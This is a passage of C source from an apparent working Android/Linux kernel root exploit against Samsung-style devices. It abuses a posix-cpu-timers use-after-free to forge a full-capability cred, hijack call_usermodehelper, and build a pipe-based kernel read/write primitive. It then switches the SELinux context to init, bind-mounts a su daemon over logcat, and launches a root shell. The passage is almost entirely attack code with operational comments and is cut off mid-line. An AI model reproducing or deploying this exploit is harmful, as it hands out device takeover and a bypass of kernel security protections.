            logf("[-] plant%d task capture ambiguous (n=%d task=%#llx)\n",
                 tag, tcnt, T_task);
            T_task = 0;
        }
    }
    logf("[plant%d] T=%d task=%#llx\n", tag, T, T_task);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    g_slide = site0 - STATIC_TIMER_SITE;
    g_slide_set = 1;
    /* Static target: resolve against the slide learned from this plant. */
    if (static_target)
        target = static_target + (unsigned long long)g_slide;

    unsigned long long page = V & ~0x1fffULL;
    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            /*
             * The posix-cpu-timers exit loop keeps deleting head->next and
             * timerqueue_del() first does head->next = rb_next(node).
             * rb_next() returns NULL only for an RB_EMPTY_NODE, i.e. when
             * the parent color equals the node address.  Therefore the
             * value rb_erase() writes into task->cred (the parent color)
             * has to be the node address itself, and the fake cred must be
             * overlaid on the stale node.  That takes the
             * WARN_ON_ONCE(RB_EMPTY_NODE) in timerqueue_del; calling it is
             * safe because the fake path pre-zeroes panic_on_warn.
             *
             * After the erase (6.1 cred layout):
             *   +0x00 usage|uid = parent color A (uid is dirty)
             *   +0x08 gid|suid  = target, written by __rb_change_child
             *   +0x10 sgid|euid = rb_left (target)
             * uid and euid are repaired by later zero plants; suid/sgid
             * keep the target value, which is harmless for the exec.
             */
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + 0xb0 > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b < off + 0xb0 && off < b + 0x40)
                    continue;
                blob = b;
                fit = 1;
                break;
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            {
                unsigned char *pc = payload + off;

                build_payload(payload, off, V + 0x78, target);
                /* The node fields at +0x00 and +0x10 are already set; fill
                 * in the rest of the fake cred around them. */
                *(unsigned long long *)(pc + 0x28) = FULLCAP; /* inherit */
                *(unsigned long long *)(pc + 0x30) = FULLCAP; /* permitted */
                *(unsigned long long *)(pc + 0x38) = FULLCAP; /* effective */
                *(unsigned long long *)(pc + 0x40) = FULLCAP; /* bset */
                *(unsigned long long *)(pc + 0x48) = FULLCAP; /* ambient */
                *(unsigned long long *)(pc + 0x78) = page + blob;
                *(unsigned long long *)(pc + 0x80) =
                    ROOT_USER_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x88) =
                    INIT_USER_NS_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x90) =
                    INIT_UCOUNTS_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x98) =
                    INIT_GROUPS_STATIC + g_slide;
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                    SELINUX_SID_KERNEL;                    /* osid */
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
                    SELINUX_SID_KERNEL;                    /* sid */
                logf("[+] plant%d fake cred at=%#llx blob=%#zx "
                     "sec=%#llx\n", tag, V + 0x78, blob, page + blob);
            }
        }
        else if (mode == 3)
        {
            /*
             * UMH injection (fusion-s24u port).  The fake work_struct lives
             * at page+ROOT_UMH_WORK_OFF and umh_kernel_data at
             * page+ROOT_UMH_DATA_OFF, both fully under our control.  The
             * rb node is prepared with:
             *   parent_color = &work->entry  -> the primitive writes this
             *                                    value to rb_left (the
             *                                    worklist next field)
             *   rb_left      = worklist      -> worklist->next = &entry
             *   side effect: *(parent+8) = work+0x10 sets entry.prev
             * Side effects all land inside our page or restore the empty
             * list, so nothing outside is corrupted.
             */
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long work = page + ROOT_UMH_WORK_OFF;
            unsigned long long entry = work + WORK_ENTRY_OFF;
            unsigned long long data = page + ROOT_UMH_DATA_OFF;
            unsigned char *pc = payload + off;
            struct umh_kernel_data ud;

            memset(&ud, 0, sizeof(ud));
            snprintf(ud.path, sizeof(ud.path), "%s", ROOT_UMH_PATH);
            snprintf(ud.path + 16, sizeof(ud.path) - 16, "%s",
                 ROOT_UMH_ARG);
            snprintf(ud.uid, sizeof(ud.uid), "%u", (unsigned)getuid());
            {
                unsigned long long completion_addr =
                    data + __builtin_offsetof(struct umh_kernel_data,
                                              completion);
                unsigned long long path_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, path);
                unsigned long long arg_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, arg);
                unsigned long long uid_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, uid);
                unsigned long long argv_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, argv);
                unsigned long long envp_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, envp);

                ud.completion.next = completion_addr +
                    __builtin_offsetof(struct umh_completion, next);
                ud.completion.prev = ud.completion.next;
                ud.argv[0] = path_addr;
                ud.argv[1] = path_addr + 16;
                ud.argv[2] = 0;
                ud.argv[3] = 0;
                ud.envp[0] = 0;
                (void)envp_addr;
            }
            memcpy(payload + ROOT_UMH_DATA_OFF, &ud, sizeof(ud));
            /* fake work_struct: data = fake_pwq|1<<4|5 (pwq ptr + color 1 +
             * WORK_STRUCT_PENDING_LY|NO_POOL sentinel), entry.next/prev =
             * worklist (self-empty on list_del), func = UMH exec work. */
            {
                unsigned long long fake_pwq = page + ROOT_UMH_PWQ_OFF;
                unsigned long long *w = (unsigned long long
                                         *)(payload + ROOT_UMH_WORK_OFF);

                memset(w, 0, 48);
                w[0] = fake_pwq | 0x15;    /* data: pwq|color<<4|5 */
                w[1] = target;             /* entry.next = worklist */
                w[2] = target;             /* entry.prev = worklist */
                w[3] = UMH_EXEC_WORK_STATIC + g_slide; /* func */
                /* fake pwq: ->wq must be the real system_unbound_wq so the
                 * flags read succeeds; refcnt/colors are page-local. */
                {
                    unsigned long long *p = (unsigned long long
                                             *)(payload + ROOT_UMH_PWQ_OFF);

                    memset(payload + ROOT_UMH_PWQ_OFF, 0, 0x80);
                    p[PWQ_POOL_OFF / 8] = 0;         /* pool: unused here */
                    p[PWQ_WQ_OFF / 8] =
                        SYSTEM_UNBOUND_WQ_STATIC + g_slide;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_WORK_COLOR_OFF) = 1;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_NR_IN_FLIGHT_OFF + 4) = 1;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_NR_ACTIVE_OFF) = 1;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_MAX_ACTIVE_OFF) = 8;
                }
            }
            /* fake subprocess_info laid out at the work_struct: work(48)
             * then complete/path/argv/envp/wait/retval/init/cleanup/data
             * (fusion-s24u layout, verified against this kernel). */
            {
                unsigned long long *s = (unsigned long long
                                         *)(payload + ROOT_UMH_WORK_OFF);
                unsigned long long completion_addr =
                    data + __builtin_offsetof(struct umh_kernel_data,
                                              completion);
                unsigned long long path_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, path);
                unsigned long long argv_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, argv);
                unsigned long long envp_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, envp);

                /* s[0..5] are work->data/entry/func (already set). */
                s[6] = completion_addr;     /* complete */
                s[7] = path_addr;           /* path */
                s[8] = argv_addr;           /* argv */
                s[9] = envp_addr;           /* envp */
                /* wait = UMH_WAIT_EXEC(1)? fusion uses 0 (async): the
                 * kernel kfree's the info itself after exec. */
                *(int *)(payload + ROOT_UMH_WORK_OFF + 48 + 32) = 0;
            }
            /* rb node: parent_color = entry (color bits 0) */
            build_payload(payload, off, entry, target);
            (void)pc;
            logf("[+] plant%d umh work=%#llx entry=%#llx data=%#llx "
                 "func=%#llx\n", tag, work, entry, data,
                 UMH_EXEC_WORK_STATIC + g_slide);
        }
        else if (mode == 4)
        {
            /*
             * Arbitrary "non-zero pointer" write: rb_erase writes
             * parent_color (= our page address, non-zero) into rb_left
             * (the target).  parent = parent_color & ~3 points into our
             * page, so the __rb_change_child side effect
             * (*(parent+8) = rb_left) lands on payload+0x1008 — harmless.
             * Used for DEFEX gates that test != 0.
             */
            unsigned long long page = V & ~0x1fffULL;

            build_payload(payload, off, page + 0x1000, target);
            logf("[+] plant%d arb write target=%#llx value=%#llx\n",
                 tag, target, page + 0x1000);
        }
        else if (mode == 6)
        {
            /*
             * Pipe read/write primitive (RiosWesley design).  rb_erase
             * writes our page address into pipe->bufs; the parent+8 side
             * effect lands on fake buffer 0 (unused because pipe->tail is
             * 1).  The fake pipe_buffer at node+0x28 describes the target
             * RAM page, so pipe_read() copies kernel memory to userspace
             * and a CAN_MERGE pipe_write() merges into it.
             */
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long spage = 0;
            unsigned int poff = 0;

            if (g_pipe_self)
            {
                spage = spage_of_linear(page);
                poff = 0;
            }
            else if (g_pipe_target_page)
            {
                spage = g_pipe_target_page;
                poff = g_pipe_target_off;
            }
            else
            {
                /* default target: the page containing system_unbound_wq */
                unsigned long long sym_phys = g_kimage_phys +
                    (SYSTEM_UNBOUND_WQ_STATIC - KERNEL_VA_BASE);

                spage = spage_of_linear(g_base + sym_phys);
                poff = (unsigned int)(sym_phys & 0xfffULL);
                logf("[+] readwq phys=%#llx spage=%#llx poff=%#x\n",
                     sym_phys, spage, poff);
            }

            if (off + PIPE_BUF_FAKE_OFF + 0x28 > 0x2000)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            /*
             * Self-parent node (same trick as the fake cred): rb_erase
             * writes the node address (V+0x78) into pipe->bufs.  The fake
             * pipe_buffer array therefore starts at the node, and buffer 1
             * (used because pipe->tail == 1) lives at node+0x28.
             */
            build_payload(payload, off, V + 0x78, target);
            memset(payload + off + PIPE_BUF_FAKE_OFF, 0, 0x28);
            *(unsigned long long *)(payload + off + PIPE_BUF_FAKE_OFF +
                                    0x00) = spage;
            *(unsigned int *)(payload + off + PIPE_BUF_FAKE_OFF + 0x08) =
                poff;
            *(unsigned int *)(payload + off + PIPE_BUF_FAKE_OFF + 0x0c) =
                g_pipe_write ? 0 : 0x1000;
            *(unsigned long long *)(payload + off + PIPE_BUF_FAKE_OFF +
                                    0x10) =
                ANON_PIPE_BUF_OPS_STATIC + g_slide;
            *(unsigned int *)(payload + off + PIPE_BUF_FAKE_OFF + 0x18) =
                g_pipe_write ? 0x10 : 0; /* PIPE_BUF_FLAG_CAN_MERGE */
            if (g_pipe_self)
                *(unsigned long long *)(payload + 0x00) =
                    0x1122334455667788ULL;
            logf("[+] plant%d pipe page=%#llx node=%#llx poff=%#x "
                 "spage=%#llx ops=%#llx\n", tag, page, V + 0x78, poff,
                 spage, ANON_PIPE_BUF_OPS_STATIC + g_slide);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx fake=%#llx node=%#llx pfn=%#llx "
             "slab=%#llx slide=%#llx recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, V + 0x78, V + 0x78, pfn, slab_pfn, g_slide,
             nrec, slab_own, g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = (mode == 2 ? g_fpool_n : g_pool_n) / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].pool = (mode == 2) ? g_fpool : g_pool;
            args[i].pool_n = (mode == 2) ? g_fpool_n : g_pool_n;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        /*
         * The trigger never exited, so the exec/kill chain stalled and
         * timer-go was already written.  If the exec thread (etid) still
         * exists, de_thread() has not run: exec has not reached
         * posix_cpu_timers_exit(), the timers are still live and a normal
         * kill/reap will dequeue them through siglock, without touching a
         * stale node.  That makes the retry safe.
         */
        int exec_tid_alive = etid &&
                             syscall(SYS_tgkill, T, etid, 0) == 0;

        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        drain_spray(mode == 2);
        trace_stop();
        if (exec_tid_alive)
        {
            /*
             * Kill the stalled trigger to stop its helpers.  The node may
             * be stale if the exec teardown raced, so the reap is made safe
             * first (repair_zombie empties the timer queues), then the
             * trigger is reaped and no zombie is left behind.
             */
            kill(T, SIGKILL);
            logf("[-] plant%d no zombie (code=%d status=%d, etid=%d "
                 "still alive); killed, repairing+reaping\n",
                 tag, si.si_code, si.si_status, etid);
            repair_zombie(T, T_task, raw, tag);
            res->retry = 1;
            return;
        }
        logf("[-] plant%d no zombie (code=%d status=%d); repairing+reaping\n",
             tag, si.si_code, si.si_status);
        /* Kill first so no live timer can re-arm a queue leftmost while the
         * repair writes run; cleanup only happens at reap on this kernel. */
        kill(T, SIGKILL);
        repair_zombie(T, T_task, raw, tag);
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        drain_spray(mode == 2);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap code=%d status=%d not SIGKILL; repairing+reaping\n",
             tag, si.si_code, si.si_status);
        repair_zombie(T, T_task, raw, tag);
        return;
    }
    /*
     * Order-1 reclaim only: android.hardwar consumes order-0 pages as soon as
     * V's slab splits, so an order-0 spray loses the race.  An order-1 frag
     * claims the whole freed slab before it ever splits.  Phase 1 must already
     * be spraying when the free happens (no free-detect delay), so keep both
     * phases running continuously.
     */
    atomic_store(&g_burst, 1);
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
                dump_victim_trace(slab_pfn);
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                /*
                 * Order-0 reclaim the instant V's page is freed, before the
                 * system processes (kmxservice/knox) grab it.  Zero-mode
                 * only: a pipe page carries a parent=0 node, and in mode 2
                 * that would NULL task->cred instead of installing the fake
                 * cred.
                 */
                if (mode != 2)
                    pipe_spray((unsigned)((V + 0x78) & 0xfff), target);
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    /*
     * Do NOT drain yet on the success path: the rb_erase write fires from
     * release_task() during waitpid(T) below, so the payload page at V+0x78
     * must stay allocated until then.
     */
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    dump_victim_trace(slab_pfn);
    if (!hit)
    {
        /*
         * The victim slab can stay in SLUB's partial list instead of
         * returning to the buddy allocator, so the spray never sees its
         * pfn.  Keep the zombie (the stale node is not erased while it is
         * unreaped) and let stage_write pick a new victim.
         */
        logf("[-] plant%d burst missed; repairing+reaping; retryable\n", tag);
        /* No erase will use this payload (the stale node is not the one the
         * repair touches), so reclaim the spray memory before the repair's
         * own plants run against empty pools. */
        drain_spray(mode == 2);
        repair_zombie(T, T_task, raw, tag);
        res->retry = 1;
        return;
    }

    usleep(1000);
    int st = 0, reaped = 0;

    /*
     * The trigger child is normally SIGKILLed by its killer helper once the
     * exec thread dies, which runs the task cleanup (the rb_erase write).
     * On this kernel that helper sometimes never sees the exec thread die, so
     * a blocking waitpid hangs the whole exploit and the stuck process
     * eventually panics the device.  Wait with a timeout instead and SIGKILL
     * the child ourselves if needed: SIGKILL still runs do_exit and thus the
     * cleanup_timerqueue write, while never hanging.
     */
    for (int i = 0; i < 300 && !reaped; i++)
    {
        pid_t rp = waitpid(T, &st, WNOHANG);

        if (rp == T)
        {
            reaped = 1;
            break;
        }
        if (rp < 0)
            break;
        usleep(10000);
    }
    if (!reaped)
    {
        kill(T, SIGKILL);
        waitpid(T, &st, 0);
    }
    logf("[+] plant%d reaped status=%#x (reaped=%d)\n", tag, st, reaped);
    /* The erase already fired inside release_task() above, so the payload
     * page is no longer needed: reclaim the spray memory. */
    if (mode != 2)
        drain_spray(0);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * Stable pipe primitive: after the bootstrap plant, pipe->bufs points at
 * the user page below (through its linear alias), so the fake pipe_buffer
 * living there is edited from userspace between operations -- no further
 * timer plants needed.  read(fd) copies out the described kernel page;
 * write(fd) merges into it (PIPE_BUF_FLAG_CAN_MERGE).
 */
static void user_buf_set(unsigned char *page, unsigned long long spage,
                         unsigned int off, unsigned int len,
                         unsigned int flags)
{
    unsigned char *b = page + PIPE_BUF_FAKE_OFF;

    *(unsigned long long *)(b + 0x00) = spage;
    *(unsigned int *)(b + 0x08) = off;
    *(unsigned int *)(b + 0x0c) = len;
    *(unsigned long long *)(b + 0x10) =
        ANON_PIPE_BUF_OPS_STATIC + g_slide;
    *(unsigned int *)(b + 0x18) = flags;
}

static int user_pipe_read(int fd, unsigned char *page,
                          unsigned long long addr, void *buf, size_t len)
{
    unsigned long long phys;
    unsigned int off;
    size_t got = 0;

    if (addr < g_base || addr >= 0xffffffc000000000ULL)
        return -1;
    phys = addr - g_base;
    off = (unsigned int)(phys & 0xfffULL);
    if (off + len > 0x1000)
        len = 0x1000 - off;
    user_buf_set(page, spage_of_linear(addr), off, 0x1000, 0);
    while (got < len)
    {
        ssize_t n = read(fd, (unsigned char *)buf + got, len - got);

        if (n < 0)
        {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            break;
        got += (size_t)n;
    }
    return (int)got;
}

static int user_pipe_write(int fd, unsigned char *page,
                           unsigned long long addr, const void *buf,
                           size_t len)
{
    unsigned long long phys;
    unsigned int off;
    ssize_t n;
    int e;

    /* Kernel-image VAs (.data symbols) go through their linear alias.
     * g_kimage_phys already includes the KASLR slide and callers pass
     * runtime (slid) VAs, so the slide must not be counted twice. */
    if (addr >= KERNEL_VA_BASE && addr < KERNEL_VA_BASE + 0x4000000ULL)
    {
        phys = (g_kimage_phys - g_slide) + (addr - KERNEL_VA_BASE);
        addr = g_base + phys;
    }
    if (addr < g_base || addr >= 0xffffffc000000000ULL)
        return -1;
    phys = addr - g_base;
    off = (unsigned int)(phys & 0xfffULL);
    if (off + len > 0x1000)
        len = 0x1000 - off;
    user_buf_set(page, spage_of_linear(addr), off, 0, 0x10); /* CAN_MERGE */
    errno = 0;
    n = write(fd, buf, len);
    e = errno;
    logf("[+] user_pipe_write addr=%#llx off=%#x n=%zd errno=%d\n",
         addr, off, n, e);
    return (int)n;
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            /*
             * Derive this boot's slide from the leaked cred call site
             * (prepare_creds' kmem_cache_alloc return address) and expect
             * dup_task_struct's kmem_cache_alloc_node site shifted by it.
             */
            if (c && site)
                tc = scan_task_allocs(raw, (size_t)n, getpid(), &task,
                                      site - CRED_SITE_STATIC +
                                          TASK_SITE_STATIC);
            else
                tc = scan_task_allocs(raw, (size_t)n, getpid(), &task, 0);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

/*
 * Re-exec'd by the shell-mode child after setuid(0).  Only now, with
 * euid 0, does the exec hand back the bounding-set capabilities, which
 * include CAP_SETGID.  Adding supplementary groups 1000 (system) and
 * 2000 (shell) lets the shell read /data, /data/app and
 * /data/local/tmp without changing euid, so the capabilities survive.
 */
static int setshell_main(const char *mode)
{
    gid_t groups[64];
    static const gid_t extra[] = {1000, 2000};
    int n = getgroups((int)(sizeof(groups) / sizeof(groups[0])), groups);
    int added = 0;
    {
        FILE *sf = fopen("/proc/self/status", "r");
        char line[256];

        if (sf)
        {
            while (fgets(line, sizeof(line), sf))
                if (!strncmp(line, "Uid:", 4) || !strncmp(line, "Gid:", 4) ||
                    !strncmp(line, "CapInh:", 7) || !strncmp(line, "CapPrm:", 7) ||
                    !strncmp(line, "CapEff:", 7) || !strncmp(line, "CapBnd:", 7) ||
                    !strncmp(line, "NoNewPrivs:", 11))
                    logf("[setshell] %s", line);
            fclose(sf);
        }
        logf("[setshell] securebits=%ld\n",
             (long)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0));
    }

    if (n < 0)
        n = 0;
    for (size_t i = 0; i < sizeof(extra) / sizeof(extra[0]); i++)
    {
        int have = 0;

        for (int j = 0; j < n; j++)
            if (groups[j] == extra[i])
                have = 1;
        if (!have && n < (int)(sizeof(groups) / sizeof(groups[0])))
        {
            groups[n++] = extra[i];
            added++;
        }
    }
    if (n && setgroups(n, groups) != 0)
        logf("[!] setgroups failed errno=%d\n", errno);
    else
        logf("[+] supplementary groups: +%d (1000/2000)\n", added);

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            /* Print `id` first: front ends (TimerRoot) poll for the
             * "uid=0(root)" marker to know the shell is live before they
             * start writing commands to its stdin. */
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; exec /system/bin/sh -i", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/*
 * UMH helper (runs as /data/local/tmp/samtimer/uhexec via call_usermodehelper,
 * so this process has a genuine kernel-issued root cred -- no forgery,
 * and its death is an ordinary exit).  The usermodehelper context has
 * /dev/null stdio, so redirect to a log first; the parent waits for the
 * marker file as its readiness signal.  Then hand off to the usual stage
 * script: init domain, private mount ns, ksud bind-mounted over logcat
 * (KDP-safe exec), late-load.
 */
static int setksu_main(void)
{
    int fd;

    fd = open("/data/local/tmp/samtimer/umh-kdp.log",
              O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0)
    {
        (void)dup2(fd, 1);
        (void)dup2(fd, 2);
        if (fd > 2)
            close(fd);
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    logf("[umh] helper start uid=%d ctx=%s enf=%d\n", getuid(), "self",
         open("/sys/fs/selinux/enforce", O_RDONLY) >= 0 ? 1 : 0);
    fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd >= 0)
    {
        (void)!write(fd, "u:r:init:s0", 11);
        close(fd);
    }
    if (unshare(CLONE_NEWNS) == 0)
    {
        (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
        (void)mount("/data/local/tmp/samtimer/ksud", "/system/bin/logcat",
                    NULL, MS_BIND, NULL);
    }
    /* Readiness marker: the exploit parent polls for this file. */
    fd = open("/data/local/tmp/samtimer/umh-action.log",
              O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0)
        close(fd);
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        char *const av[] = {(char *)"sh",
